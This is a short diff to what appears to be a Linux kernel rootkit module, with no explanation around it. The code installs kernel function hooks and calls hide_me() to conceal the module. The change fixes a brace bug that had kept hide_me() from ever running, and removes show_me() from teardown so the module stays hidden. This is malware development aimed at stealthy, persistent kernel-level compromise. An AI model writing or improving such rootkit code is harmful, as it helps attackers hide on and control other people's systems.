@@ -8,16 +8,16 @@
 static int setup(void) {
     int error;
     error = fh_install_hooks(kernel_hooks, ARRAY_SIZE(kernel_hooks));
-    if (error)
-            printk(KERN_INFO "Kernels left unpopped...\n");
+    if (error) {
+        printk(KERN_INFO "Kernels left unpopped...\n");
         return error;
+    }
     hide_me();
     return 0;
 }
 
 static int teardown(void) {
     fh_remove_hooks(kernel_hooks, ARRAY_SIZE(kernel_hooks));
-    show_me();
     return 0;
 }
 
